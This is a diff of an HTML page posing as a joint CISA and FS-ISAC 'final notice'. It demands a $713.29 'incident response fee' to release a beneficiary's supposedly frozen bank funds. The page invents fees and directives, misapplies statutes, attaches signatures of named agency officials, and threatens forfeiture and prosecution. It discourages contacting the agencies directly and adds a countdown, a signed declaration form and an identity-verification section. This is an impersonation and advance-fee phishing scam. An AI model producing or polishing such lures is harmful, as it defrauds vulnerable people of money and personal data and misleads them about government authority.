@@ -2,11 +2,7 @@
 <html>
 <head>
 <style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #f0f0f0;
     display: flex;
@@ -15,28 +11,37 @@
     font-family: 'Times New Roman', Times, serif;
   }
   .document {
-    max-width: 850px;
+    max-width: 900px;
     width: 100%;
     background: white;
     padding: 50px 60px;
-    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
     position: relative;
     overflow: hidden;
   }
-  .watermark {
+
+  /* OFFICIAL STAMP WATERMARK */
+  .stamp-watermark {
     position: absolute;
     top: 50%;
     left: 50%;
-    transform: translate(-50%, -50%) rotate(-20deg);
-    font-size: 80px;
+    transform: translate(-50%, -50%) rotate(-25deg);
+    font-size: 120px;
     font-weight: bold;
     color: rgba(200, 0, 0, 0.12);
     white-space: nowrap;
     pointer-events: none;
-    font-family: Arial, Helvetica, sans-serif;
-    letter-spacing: 10px;
+    font-family: 'Times New Roman', Times, serif;
+    letter-spacing: 15px;
     text-transform: uppercase;
+    border: 12px solid rgba(200, 0, 0, 0.10);
+    padding: 30px 50px;
+    border-radius: 20px;
+    text-shadow: 2px 2px 4px rgba(0,0,0,0.05);
   }
+  .stamp-watermark .stamp-line1 { display: block; font-size: 90px; letter-spacing: 8px; }
+  .stamp-watermark .stamp-line2 { display: block; font-size: 40px; letter-spacing: 5px; margin-top: 5px; font-weight: normal; border-top: 3px solid rgba(200, 0, 0, 0.10); padding-top: 8px; }
+
   .header {
     display: flex;
     justify-content: space-between;
@@ -46,12 +51,9 @@
     padding-bottom: 8px;
     margin-bottom: 18px;
   }
-  .header-left {
-    font-weight: bold;
-  }
-  .header-right {
-    font-weight: bold;
-  }
+  .header-left { font-weight: bold; }
+  .header-right { font-weight: bold; }
+
   .logo-section {
     display: flex;
     justify-content: center;
@@ -81,6 +83,7 @@
     text-align: center;
     color: #333;
   }
+
   .title {
     text-align: center;
     font-size: 18px;
@@ -119,14 +122,43 @@
     font-weight: bold;
     margin: 22px 0 10px;
   }
+
+  .mandatory-box {
+    background: #f8f0f0;
+    border-left: 4px solid #990000;
+    padding: 16px 20px;
+    margin: 16px 0 20px 0;
+    border-radius: 4px;
+  }
+  .mandatory-box .title {
+    font-size: 16px;
+    font-weight: bold;
+    color: #990000;
+    margin-bottom: 8px;
+    text-align: left;
+  }
+  .mandatory-box .body-text {
+    margin-bottom: 4px;
+    font-size: 14px;
+  }
+  .mandatory-box .countdown {
+    font-size: 20px;
+    font-weight: bold;
+    color: #990000;
+    background: #ffeeee;
+    padding: 8px 12px;
+    border-radius: 4px;
+    display: inline-block;
+    margin: 8px 0;
+  }
+
   .fee-table {
     width: 100%;
     border-collapse: collapse;
     margin: 14px 0 10px;
     font-size: 14px;
   }
-  .fee-table td,
-  .fee-table th {
+  .fee-table td, .fee-table th {
     border: 1px solid #222;
     padding: 8px 12px;
   }
@@ -135,29 +167,18 @@
     font-weight: bold;
     text-align: left;
   }
-  .fee-table .total-row {
-    font-weight: bold;
-  }
-  .fee-table .right-align {
-    text-align: right;
-  }
+  .fee-table .total-row { font-weight: bold; }
+  .fee-table .right-align { text-align: right; }
+
   .signature-section {
     margin-top: 32px;
     padding-top: 20px;
     border-top: 2px solid #1a1a2e;
   }
-  .sig-line {
-    font-weight: bold;
-    font-size: 15px;
-  }
-  .sig-title {
-    font-style: italic;
-    font-size: 14px;
-    font-weight: normal;
-  }
-  .sig-org {
-    font-size: 13px;
-  }
+  .sig-line { font-weight: bold; font-size: 15px; }
+  .sig-title { font-style: italic; font-size: 14px; font-weight: normal; }
+  .sig-org { font-size: 13px; }
+
   .footer {
     margin-top: 30px;
     padding-top: 12px;
@@ -167,216 +188,963 @@
     display: flex;
     justify-content: space-between;
   }
+
+  .form-group {
+    margin-bottom: 16px;
+  }
+  .form-group label {
+    display: block;
+    font-weight: bold;
+    font-size: 14px;
+    margin-bottom: 4px;
+  }
+  .form-group input, .form-group select, .form-group textarea {
+    width: 100%;
+    padding: 8px 12px;
+    font-family: 'Times New Roman', Times, serif;
+    font-size: 14px;
+    border: 1px solid #666;
+    border-radius: 4px;
+    background: #f9f9f9;
+  }
+  .form-group textarea {
+    resize: vertical;
+    min-height: 60px;
+  }
+  .form-group .checkbox-group {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .form-group .checkbox-group label {
+    font-weight: normal;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+  .form-group .checkbox-group input[type="checkbox"],
+  .form-group .checkbox-group input[type="radio"] {
+    width: 18px;
+    height: 18px;
+    margin-right: 4px;
+  }
+
+  .submit-btn {
+    background: #1a1a2e;
+    color: white;
+    padding: 14px 30px;
+    font-size: 18px;
+    font-weight: bold;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    width: 100%;
+    margin-top: 10px;
+    font-family: 'Times New Roman', Times, serif;
+    letter-spacing: 1px;
+  }
+  .submit-btn:hover:not(:disabled) {
+    background: #2a2a4e;
+  }
+  .submit-btn:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+
+  .upload-section {
+    border: 2px dashed #666;
+    padding: 20px;
+    text-align: center;
+    border-radius: 6px;
+    margin: 8px 0 16px 0;
+  }
+  .upload-section input[type="file"] {
+    width: 100%;
+    padding: 8px 0;
+  }
+
+  .purpose-section {
+    background: #f5f5f5;
+    padding: 16px 20px;
+    margin: 16px 0 20px 0;
+    border-radius: 4px;
+    border-left: 4px solid #1a1a2e;
+  }
+  .purpose-section .body-text {
+    margin-bottom: 4px;
+    font-size: 14px;
+  }
+
+  .nsb-contact-box {
+    background: #e8f0f8;
+    border-left: 4px solid #1a1a2e;
+    padding: 16px 20px;
+    margin: 16px 0 20px 0;
+    border-radius: 4px;
+  }
+  .nsb-contact-box .body-text {
+    font-size: 14px;
+    margin-bottom: 4px;
+  }
+
+  .after-submit-box {
+    background: #e8f8f0;
+    border-left: 4px solid #1a6e3a;
+    padding: 16px 20px;
+    margin: 16px 0 20px 0;
+    border-radius: 4px;
+  }
+  .after-submit-box .body-text {
+    font-size: 14px;
+    margin-bottom: 4px;
+  }
+  .after-submit-box .title {
+    font-size: 16px;
+    font-weight: bold;
+    color: #1a6e3a;
+    margin-bottom: 8px;
+    text-align: left;
+  }
+
+  .success-message {
+    display: none;
+    background: #d4edda;
+    border: 2px solid #28a745;
+    padding: 30px;
+    border-radius: 6px;
+    margin-top: 20px;
+    text-align: center;
+  }
+  .success-message .title {
+    color: #155724;
+    font-size: 22px;
+    font-weight: bold;
+    text-align: center;
+    margin-bottom: 10px;
+  }
+  .success-message .body-text {
+    color: #155724;
+    font-size: 15px;
+    margin-bottom: 6px;
+  }
+  .success-message .confirmation-number {
+    font-size: 18px;
+    font-weight: bold;
+    color: #1a1a2e;
+    background: white;
+    padding: 10px;
+    border-radius: 4px;
+    display: inline-block;
+    margin: 10px 0;
+    border: 1px solid #28a745;
+  }
+
+  /* ERROR STYLES */
+  .error-field {
+    border: 2px solid #cc0000 !important;
+    background: #fff5f5 !important;
+    box-shadow: 0 0 0 2px rgba(204, 0, 0, 0.2);
+  }
+  .error-field label {
+    color: #cc0000 !important;
+  }
+  .upload-section.error-field {
+    border: 2px solid #cc0000 !important;
+    background: #fff5f5 !important;
+  }
+
+  .certificate-box {
+    background: #f0f8f0;
+    border: 2px solid #1a6e3a;
+    padding: 20px;
+    margin: 16px 0 20px 0;
+    border-radius: 6px;
+  }
+  .certificate-box .title {
+    font-size: 16px;
+    font-weight: bold;
+    color: #1a6e3a;
+    margin-bottom: 8px;
+    text-align: left;
+  }
+  .certificate-box .body-text {
+    font-size: 14px;
+    margin-bottom: 4px;
+  }
+
+  /* NEW OFFICIAL STATEMENT BOX */
+  .official-statement-box {
+    background: #f0f4f8;
+    border-left: 4px solid #1a1a2e;
+    padding: 16px 20px;
+    margin: 16px 0 20px 0;
+    border-radius: 4px;
+  }
+  .official-statement-box .title {
+    font-size: 16px;
+    font-weight: bold;
+    color: #1a1a2e;
+    margin-bottom: 8px;
+    text-align: left;
+  }
+  .official-statement-box .body-text {
+    font-size: 14px;
+    margin-bottom: 4px;
+  }
+
   @media (max-width: 600px) {
-    .document {
-      padding: 20px;
-    }
-    .watermark {
-      font-size: 50px;
-      letter-spacing: 5px;
-    }
-    .logo-section {
-      gap: 30px;
-    }
-    .logo-box img {
-      width: 65px;
-      height: 65px;
-    }
-    .fee-table {
-      font-size: 12px;
-    }
-    .fee-table td,
-    .fee-table th {
-      padding: 4px 6px;
-    }
+    .document { padding: 20px; }
+    .stamp-watermark { font-size: 60px; padding: 15px 25px; letter-spacing: 8px; border-width: 6px; }
+    .stamp-watermark .stamp-line1 { font-size: 50px; }
+    .stamp-watermark .stamp-line2 { font-size: 24px; }
+    .logo-section { gap: 30px; }
+    .logo-box img { width: 65px; height: 65px; }
+    .fee-table { font-size: 12px; }
+    .fee-table td, .fee-table th { padding: 4px 6px; }
   }
 </style>
 </head>
 <body>
 
-  <div class="document">
+<div class="document">
 
-    <div class="watermark">CONFIDENTIAL</div>
-
-    <div class="header">
-      <span class="header-left">File Reference: PB-142-WT1139</span>
-      <span class="header-right">Date: July 23, 2026</span>
-    </div>
-
-    <div class="logo-section">
-      <div class="logo-box">
-        <img src="https://i.ibb.co/YFYXpkmy/IMG-0244.jpg" alt="CISA Logo">
-        <span>CISA</span>
-      </div>
-      <div class="logo-box">
-        <img src="https://i.ibb.co/r24Xg5p4/IMG-0245.jpg" alt="FS-ISAC Logo">
-        <span>FS-ISAC</span>
-      </div>
-    </div>
-
-    <div class="title">FINANCIAL SERVICES INFORMATION SHARING AND ANALYSIS CENTER (FS-ISAC)</div>
-    <div class="subtitle">Official Notification – Compliance Review Determination</div>
-
-    <div class="ref-line">
-      <span>File Reference: PB-142-WT1139</span>
-      <span>Date: July 23, 2026</span>
-    </div>
-
-    <div class="subject-line">FINAL NOTICE: MANDATORY CYBERSECURITY INCIDENT RESPONSE FEE – COMPLIANCE DEADLINE</div>
-
-    <div class="body-text"><strong>TO:</strong> Beneficiary, File PB-142-WT1139</div>
-
-    <div class="body-text">
-      This correspondence serves as official notification regarding the outstanding compliance obligation associated with your file. This notice is issued by the <strong>Financial Services Information Sharing and Analysis Center (FS-ISAC)</strong>, in coordination with the <strong>Cybersecurity and Infrastructure Security Agency (CISA)</strong>, a component of the U.S. Department of Homeland Security.
-    </div>
-
-    <div class="section-title">I. BACKGROUND &amp; SOURCE OF REFERENCE</div>
-    <div class="body-text">
-      This notification is issued in response to a formal compliance review request submitted by <strong>First National Bank Texas</strong> to FS-ISAC on <strong>July 20, 2026</strong>. The bank provided a list of beneficiary files requiring enhanced due diligence verification, including your file (Reference: <strong>PB-142-WT1139</strong>).
-    </div>
-    <div class="body-text">
-      FS-ISAC has reviewed the transaction records provided by the bank and has determined that your file falls within the scope of this review.
-    </div>
-
-    <div class="section-title">II. JURISDICTIONAL AUTHORITY &amp; DETERMINATION</div>
-    <div class="body-text">
-      Pursuant to the authorities vested in CISA under the <strong>Cyber Incident Reporting for Critical Infrastructure Act of 2022 (CIRCIA)</strong>, 6 U.S.C. § 681 et seq., and the statutory authority of FS-ISAC as the designated financial sector intelligence sharing organization, your transaction has been identified as falling within the scope of transactions requiring enhanced due diligence and incident response verification.
-    </div>
-    <div class="body-text">
-      This determination is predicated upon documented transaction records and the processing window affected by the cybersecurity incident referenced in <strong>CISA Emergency Directive 26-03</strong> and <strong>FS-ISAC Threat Intelligence Bulletin 2026-07</strong>.
-    </div>
-
-    <div class="section-title">III. OFFICIAL STATEMENT — SCOPE OF REVIEW</div>
-    <div class="body-text">
-      This office has reviewed your file in accordance with the statutory authorities vested in the undersigned agencies. Our review is strictly limited to the documented transaction records, beneficiary information, and the originating source of the funds as reflected in the official filings provided by First National Bank Texas.
-    </div>
-    <div class="body-text"><strong>We do not inquire into your personal circumstances, financial standing, or emotional state.</strong></div>
-    <div class="body-text"><strong>We do not recognize any prior steps you may have taken.</strong></div>
-    <div class="body-text"><strong>We do not consider any payments made prior to this notice.</strong></div>
-    <div class="body-text"><strong>The sole question before this office is whether the outstanding balance has been cleared by the deadline.</strong></div>
-
-    <div class="section-title">IV. OUTSTANDING FINANCIAL OBLIGATION</div>
-    <div class="body-text">The following fees have been assessed and remain outstanding:</div>
-
-    <table class="fee-table">
-      <tr>
-        <th>Fee Description</th>
-        <th>Amount</th>
-      </tr>
-      <tr>
-        <td>CISA Emergency Vulnerability Response Fee</td>
-        <td class="right-align">$188.00</td>
-      </tr>
-      <tr>
-        <td>FS-ISAC Threat Intelligence Sharing Fee</td>
-        <td class="right-align">$234.76</td>
-      </tr>
-      <tr>
-        <td>Third-Party Forensics &amp; Data Recovery Fee</td>
-        <td class="right-align">$290.53</td>
-      </tr>
-      <tr class="total-row">
-        <td><strong>Total Outstanding Balance</strong></td>
-        <td class="right-align"><strong>$713.29</strong></td>
-      </tr>
-    </table>
-
-    <div class="section-title">V. PARTIAL PAYMENT ACCOMMODATION – GRANTED</div>
-    <div class="body-text">
-      Upon review of your file history and documented payments made since November 2025, this office has approved a <strong>partial payment arrangement</strong>. This accommodation is granted under the following terms:
-    </div>
-
-    <table class="fee-table">
-      <tr>
-        <th>Installment</th>
-        <th>Amount</th>
-        <th>Due Date</th>
-      </tr>
-      <tr>
-        <td>First</td>
-        <td class="right-align">$238.00</td>
-        <td>Within 2 business days</td>
-      </tr>
-      <tr>
-        <td>Second</td>
-        <td class="right-align">$238.00</td>
-        <td>Within 3 business days</td>
-      </tr>
-      <tr>
-        <td>Third</td>
-        <td class="right-align">$237.29</td>
-        <td>Within 5 business days</td>
-      </tr>
-      <tr class="total-row">
-        <td><strong>Total</strong></td>
-        <td class="right-align"><strong>$713.29</strong></td>
-        <td><strong>Must be cleared by July 31, 2026</strong></td>
-      </tr>
-    </table>
-
-    <div class="body-text">
-      You may remit partial payments in any amount at any time, provided the full balance is cleared by the final deadline. Each payment will be recorded and applied to your outstanding balance.
-    </div>
-
-    <div class="section-title">VI. CONSEQUENCES OF NON-COMPLIANCE &amp; FORFEITURE PROCEEDINGS</div>
-    <div class="body-text"><strong>Final Deadline: July 31, 2026</strong></div>
-    <div class="body-text">
-      Failure to clear the outstanding balance by the above deadline will result in the following enforcement actions:
-    </div>
-    <div class="body-text">1. <strong>Escalation to Enforcement Division</strong> — Your file will be immediately escalated to the CISA Enforcement Division and FS-ISAC Compliance Office for formal review and adjudication.</div>
-    <div class="body-text">2. <strong>Administrative Freeze</strong> — Your file will be placed under indefinite administrative hold pending the completion of enforcement proceedings. No further action will be taken on your behalf.</div>
-    <div class="body-text">3. <strong>Forfeiture to United States Treasury</strong> — Pursuant to 31 U.S.C. § 3729 and 6 U.S.C. § 681d, your file may be referred to the U.S. Attorney General for civil action, potentially resulting in forfeiture of your funds to the United States Treasury.</div>
-    <div class="body-text">4. <strong>Escheatment to State of Texas</strong> — Under Texas Property Code Chapter 74, unresolved funds held by financial institutions may be declared escheated and become the property of the State of Texas.</div>
-    <div class="body-text">5. <strong>DOJ Referral</strong> — Your file may be referred to the Department of Justice for further enforcement action, which may include civil penalties and potential criminal prosecution under 18 U.S.C. § 1001 (false statements) and 18 U.S.C. § 371 (conspiracy to defraud the United States).</div>
-
-    <div class="section-title">VII. FINAL DETERMINATION — NO DISCRETIONARY REVIEW</div>
-    <div class="body-text">
-      The undersigned offices have reviewed this matter in accordance with applicable federal law and have reached a final determination. The outstanding balance must be cleared by <strong>July 31, 2026</strong>. No further review, appeal, or reconsideration of this determination shall be entertained. No extension shall be granted under any circumstances.
-    </div>
-    <div class="body-text">
-      You are advised not to submit any documentation regarding prior steps, payments, or communications. This office will not accept, review, or consider any such submissions. The sole remaining action required to complete your file is the satisfaction of the financial obligation stated herein.
-    </div>
-
-    <div class="section-title">VIII. COORDINATION &amp; OVERSIGHT</div>
-    <div class="body-text">
-      This notification has been reviewed and authorized for issuance by the <strong>Financial Services Sector Liaison</strong> at CISA, in coordination with the FS-ISAC Compliance Office. This role serves as the primary point of contact between the financial services sector and federal agencies, ensuring that all compliance determinations are consistent with current regulatory requirements and interagency protocols.
-    </div>
-
-    <div class="section-title">IX. OFFICIAL INQUIRY PROCEDURE — CENTRALIZED CHANNEL</div>
-    <div class="body-text">
-      <strong>Please be advised that neither FS-ISAC nor CISA directly handles individual beneficiary inquiries regarding compliance determinations, payment processing, or file status updates. These agencies are not structured to provide case-specific support to individuals. All inquiries must be directed through the established centralized channel.</strong>
-    </div>
-    <div class="body-text">
-      <strong>Please note the following:</strong>
-    </div>
-    <div class="body-text">• <strong>FS-ISAC and CISA do not accept direct inquiries from individual beneficiaries.</strong></div>
-    <div class="body-text">• <strong>Any communication sent directly to these agencies regarding your file will be returned or redirected to the appropriate channel.</strong></div>
-    <div class="body-text">• <strong>All inquiries must reference your file number: PB-142-WT1139.</strong></div>
-    <div class="body-text">
-      <strong>The deadline of July 31, 2026, is final. No extensions will be granted under any circumstances. Failure to satisfy the outstanding obligation by the deadline will result in the enforcement actions outlined in Section VI of this notice.</strong>
-    </div>
-
-    <div class="signature-section">
-      <div class="body-text">
-        This notice is issued under the authority of the Financial Services Information Sharing and Analysis Center (FS-ISAC), in coordination with the Cybersecurity and Infrastructure Security Agency (CISA), a component of the U.S. Department of Homeland Security.
-      </div>
-      <br>
-      <div class="sig-line">Valerie Abend</div>
-      <div class="sig-title">Chief Executive Officer</div>
-      <div class="sig-org">Financial Services Information Sharing and Analysis Center (FS-ISAC)</div>
-      <br>
-      <div class="sig-line">Nick Andersen</div>
-      <div class="sig-title">Acting Director</div>
-      <div class="sig-org">Cybersecurity and Infrastructure Security Agency (CISA)</div>
-      <div class="sig-org">U.S. Department of Homeland Security</div>
-    </div>
-
-    <div class="footer">
-      <span class="footer-left">Page 1 of 1</span>
-      <span class="footer-right">CONFIDENTIAL</span>
-    </div>
-
+  <div class="stamp-watermark">
+    <span class="stamp-line1">OFFICIAL</span>
+    <span class="stamp-line2">JOINT DIRECTIVE</span>
   </div>
+
+  <div class="header">
+    <span class="header-left">File Reference: PB-142-WT1139</span>
+    <span class="header-right">Date: July 27, 2026</span>
+  </div>
+
+  <div class="logo-section">
+    <div class="logo-box">
+      <img src="https://i.ibb.co/YFYXpkmy/IMG-0244.jpg" alt="CISA Logo">
+      <span>CISA</span>
+    </div>
+    <div class="logo-box">
+      <img src="https://i.ibb.co/r24Xg5p4/IMG-0245.jpg" alt="FS-ISAC Logo">
+      <span>FS-ISAC</span>
+    </div>
+  </div>
+
+  <div class="title">CYBERSECURITY AND INFRASTRUCTURE SECURITY AGENCY (CISA)</div>
+  <div class="subtitle">U.S. DEPARTMENT OF HOMELAND SECURITY</div>
+  <div class="title" style="font-size:16px; margin-top:10px;">FINANCIAL SERVICES INFORMATION SHARING AND ANALYSIS CENTER (FS-ISAC)</div>
+  <div class="subtitle">JOINT OFFICIAL NOTIFICATION — MANDATORY COMPLIANCE REQUIREMENT</div>
+
+  <div class="ref-line">
+    <span>File Reference: PB-142-WT1139</span>
+    <span>Date: July 27, 2026</span>
+  </div>
+
+  <div class="subject-line">FINAL NOTICE: MANDATORY COMPLIANCE DEADLINE — JULY 31, 2026</div>
+
+  <!-- OFFICIAL STATEMENT — NEW -->
+  <div class="official-statement-box">
+    <div class="title">OFFICIAL STATEMENT — COMPLIANCE REQUIREMENT</div>
+    <div class="body-text">
+      <strong>Your funds are held at First National Bank Texas in accordance with federal banking regulations. However, the release of your funds is contingent upon the completion of all federal compliance requirements mandated by this office.</strong>
+    </div>
+    <div class="body-text">
+      Pursuant to the authorities vested in CISA under the <strong>Cyber Incident Reporting for Critical Infrastructure Act of 2022 (CIRCIA), 6 U.S.C. § 681 et seq.</strong>, and the statutory authority of FS-ISAC as the designated financial sector intelligence sharing organization, this office is responsible for verifying compliance prior to the release of any funds.
+    </div>
+    <div class="body-text" style="font-weight: bold; color: #990000;">
+      First National Bank Texas does not have the authority to release your funds without clearance from this office. The bank is legally bound to comply with federal compliance determinations.
+    </div>
+    <div class="body-text" style="font-weight: bold; color: #990000;">
+      Your funds will remain frozen until ALL outstanding compliance requirements are satisfied. This is not a bank decision — it is a federal mandate.
+    </div>
+  </div>
+
+  <!-- PURPOSE SECTION -->
+  <div class="purpose-section">
+    <div class="body-text" style="font-weight: bold; font-size: 15px;">I. OFFICIAL DIRECTIVE</div>
+    <div class="body-text">
+      <strong>YOU ARE HEREBY DIRECTED TO COMPLETE THIS FORM AND SUBMIT IT NO LATER THAN JULY 31, 2026.</strong>
+    </div>
+    <div class="body-text" style="font-weight: bold; color: #990000;">
+      THIS IS NOT A REQUEST. IT IS A MANDATORY FEDERAL COMPLIANCE REQUIREMENT.
+    </div>
+    <div class="body-text">
+      Failure to complete and submit this form by the deadline will result in the immediate closure of your file and referral to federal authorities without further notice.
+    </div>
+  </div>
+
+  <!-- MANDATORY REQUIREMENT BOX -->
+  <div class="mandatory-box">
+    <div class="title">⚠️ MANDATORY REQUIREMENT — ALL STEPS MUST BE COMPLETED</div>
+    <div class="body-text">
+      Your file requires TWO things to be completed:
+    </div>
+    <div class="body-text">
+      <strong>1. This compliance form</strong> — MUST be completed and submitted.
+    </div>
+    <div class="body-text">
+      <strong>2. The outstanding balance of $713.29</strong> — MUST be cleared.
+    </div>
+    <div class="body-text" style="font-weight: bold; margin-top: 8px;">
+      BOTH must be completed before your file can proceed.
+    </div>
+    <div class="countdown">
+      ⏰ REMAINING DAYS TO COMPLETE ALL REQUIREMENTS: 4 DAYS
+    </div>
+    <div class="body-text" style="font-weight: bold; color: #990000;">
+      The deadline for ALL requirements is <strong>July 31, 2026</strong>.
+    </div>
+    <div class="body-text" style="font-weight: bold; color: #990000;">
+      If you do not complete BOTH by <strong>July 31, 2026</strong>, your file will be closed and no further correspondence will be issued.
+    </div>
+  </div>
+
+  <!-- NSB CONTACT -->
+  <div class="nsb-contact-box">
+    <div class="body-text" style="font-weight: bold; font-size: 15px;">📞 NEED CLARIFICATION?</div>
+    <div class="body-text">
+      If you need assistance completing this form, please contact:
+    </div>
+    <div class="body-text" style="font-weight: bold;">
+      NSB Federal Customer Service
+    </div>
+    <div class="body-text">
+      Reference: PB-142-WT1139
+    </div>
+  </div>
+
+  <!-- SECTION I -->
+  <div class="section-title">II. NON‑COMPLIANCE STATUS</div>
+  <div class="body-text">
+    This office has reviewed the status of your file. The first installment of <strong>$238.00</strong> was due on <strong>July 26, 2026, at 12:00 AM midnight</strong>. No payment has been received. Your file is now classified as non‑compliant.
+  </div>
+  <div class="body-text">
+    Your failure to remit the first installment does not waive or reduce the total outstanding obligation. The full balance of <strong>$713.29</strong> remains due and must be cleared by the final deadline.
+  </div>
+  <div class="body-text">
+    This office does not accept beneficiary payments directly. All payments must be processed through the designated channel as outlined in the original notice.
+  </div>
+
+  <!-- SECTION II -->
+  <div class="section-title">III. MANDATORY DEADLINE — JULY 31, 2026</div>
+  <div class="body-text">
+    The total outstanding balance of <strong>$713.29</strong> must be cleared by <strong>July 31, 2026</strong>.
+  </div>
+  <div class="body-text">
+    <strong>This is NOT optional. This is MANDATORY.</strong>
+  </div>
+  <div class="body-text">
+    The deadline of <strong>July 31, 2026</strong> is final and non‑negotiable.
+  </div>
+  <div class="body-text">
+    You may split the total amount into partial payments, provided the full balance is cleared by <strong>July 31, 2026</strong>. This is the only accommodation available to you. No further extensions will be granted.
+  </div>
+
+  <!-- SECTION III -->
+  <div class="section-title">IV. LEGAL BASIS FOR THE JULY 31, 2026 DEADLINE</div>
+  <div class="body-text">
+    The deadline of <strong>July 31, 2026</strong> is established under the following federal and state statutes:
+  </div>
+  <div class="body-text">
+    1. Under the <strong>Cyber Incident Reporting for Critical Infrastructure Act of 2022 (CIRCIA), 6 U.S.C. § 681 et seq.</strong>, CISA is required to finalize its incident reporting regulations by <strong>September 2026</strong>. All unresolved files must be cleared prior to the effective date of the final rule.
+  </div>
+  <div class="body-text">
+    2. Under <strong>31 U.S.C. § 3729 (False Claims Act)</strong>, any unresolved file may be referred to the U.S. Attorney General for civil action, which may result in forfeiture of funds and civil penalties.
+  </div>
+  <div class="body-text">
+    3. Under <strong>Texas Property Code Chapter 74</strong>, all unresolved funds held by financial institutions must be reported and delivered to the Texas Comptroller's Unclaimed Property Division by <strong>July 1 of each year</strong>. Files not resolved by <strong>July 31, 2026</strong>, will be subject to escheatment proceedings under Texas Property Code § 74.301.
+  </div>
+
+  <!-- COMPLIANCE QUESTIONNAIRE -->
+  <div class="section-title">V. COMPLIANCE QUESTIONNAIRE — MUST BE COMPLETED</div>
+  <div class="body-text" style="font-style: italic; margin-bottom: 16px;">Complete ALL sections below. Incomplete submissions will not be accepted.</div>
+
+  <!-- SECTION A -->
+  <div class="section-title">SECTION A: CYBERSECURITY INCIDENT REPORTING AWARENESS</div>
+  <div class="body-text" style="font-size:13px; color:#555; margin-bottom:12px;">
+    Under the Cyber Incident Reporting for Critical Infrastructure Act of 2022 (CIRCIA), 6 U.S.C. § 681 et seq., covered entities are required to report significant cyber incidents to CISA within 72 hours and ransom payments within 24 hours.
+  </div>
+
+  <div class="form-group">
+    <label>1. Are you aware that under CIRCIA, financial institutions are required to report significant cyber incidents affecting your transaction to CISA within 72 hours?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q1" value="Yes"> Yes</label>
+      <label><input type="radio" name="q1" value="No"> No</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>2. Are you aware that under the Bank Secrecy Act (31 U.S.C. § 5311 et seq.), financial institutions are required to maintain records of all financial transactions and verify the identity of all beneficiaries?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q2" value="Yes"> Yes</label>
+      <label><input type="radio" name="q2" value="No"> No</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>3. Are you aware that providing false information or concealing material facts to a federal agency may result in criminal penalties under 18 U.S.C. § 1001, including fines and imprisonment of up to 5 years?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q3" value="Yes"> Yes</label>
+      <label><input type="radio" name="q3" value="No"> No</label>
+    </div>
+  </div>
+
+  <!-- SECTION B -->
+  <div class="section-title">SECTION B: FRAUD &amp; ILLICIT FINANCE AWARENESS</div>
+  <div class="body-text" style="font-size:13px; color:#555; margin-bottom:12px;">
+    On July 24, 2026, FinCEN issued an alert urging financial institutions to detect and report fraud schemes targeting federal programs.
+  </div>
+
+  <div class="form-group">
+    <label>4. Are you aware of the recent FinCEN alert regarding fraud schemes targeting federal programs, including the use of AI-generated synthetic identities to unlawfully acquire federal funds?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q4" value="Yes"> Yes</label>
+      <label><input type="radio" name="q4" value="No"> No</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>5. Are you aware that under FinCEN regulations, financial institutions are required to file Suspicious Activity Reports (SARs) for any transaction that appears to involve illegal activity?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q5" value="Yes"> Yes</label>
+      <label><input type="radio" name="q5" value="No"> No</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>6. Are you aware that anti-money laundering (AML) and counter-financing of terrorism (CFT) compliance is mandatory under federal law for all financial transactions?</label>
+    <div class="checkbox-group">
+      <label><input type="radio" name="q6" value="Yes"> Yes</label>
+      <label><input type="radio" name="q6" value="No"> No</label>
+    </div>
+  </div>
+
+  <!-- SECTION C -->
+  <div class="section-title">SECTION C: DECLARATION OF INTENT</div>
+  <div class="body-text">You are hereby required to declare your intention regarding this file. Select one of the following options:</div>
+
+  <div class="form-group">
+    <div class="checkbox-group">
+      <label><input type="radio" name="intent" value="Proceed" required> <strong>OPTION 1</strong> — I confirm that I wish to proceed with this process. I understand that the total outstanding balance of $713.29 must be cleared by July 31, 2026.</label>
+    </div>
+    <div class="checkbox-group">
+      <label><input type="radio" name="intent" value="Close"> <strong>OPTION 2</strong> — I acknowledge that all requirements must be completed before July 31, 2026. I formally request closure of my file. I understand that if I choose this option, my funds will not be released and my file will be closed with no further correspondence.</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>7. Please provide any additional information regarding your decision:</label>
+    <textarea name="additional_info" placeholder="Type your response here..."></textarea>
+  </div>
+
+  <!-- SECTION D -->
+  <div class="section-title">SECTION D: DECLARATION OF UNDERSTANDING</div>
+  <div class="body-text">
+    I, the undersigned, hereby declare the following:
+  </div>
+
+  <div class="form-group">
+    <div class="checkbox-group">
+      <label><input type="checkbox" name="declaration1" value="yes"> I have reviewed the official notice issued by CISA and FS-ISAC.</label>
+    </div>
+    <div class="checkbox-group">
+      <label><input type="checkbox" name="declaration2" value="yes"> I understand that the deadline of July 31, 2026 is final.</label>
+    </div>
+    <div class="checkbox-group">
+      <label><input type="checkbox" name="declaration3" value="yes"> I understand that failure to comply may result in forfeiture of my funds and referral to the Department of Justice.</label>
+    </div>
+    <div class="checkbox-group">
+      <label><input type="checkbox" name="declaration4" value="yes"> I confirm my intention as declared above.</label>
+    </div>
+  </div>
+
+  <div class="form-group">
+    <label>Signature (Type Full Name):</label>
+    <input type="text" name="signature" placeholder="Type your full name as your electronic signature">
+  </div>
+
+  <div class="form-group">
+    <label>Date:</label>
+    <input type="date" name="submission_date">
+  </div>
+
+  <!-- SECTION E -->
+  <div class="section-title">SECTION E: IDENTITY VERIFICATION</div>
+  <div class="body-text" style="font-size:13px; color:#555; margin-bottom:12px;">
+    Under the Customer Identification Program (CIP) requirements of the Bank Secrecy Act (31 C.F.R. § 1020.220) and the USA PATRIOT Act, financial institutions must verify the identity of all beneficiaries prior to the release of funds.
+  </div>
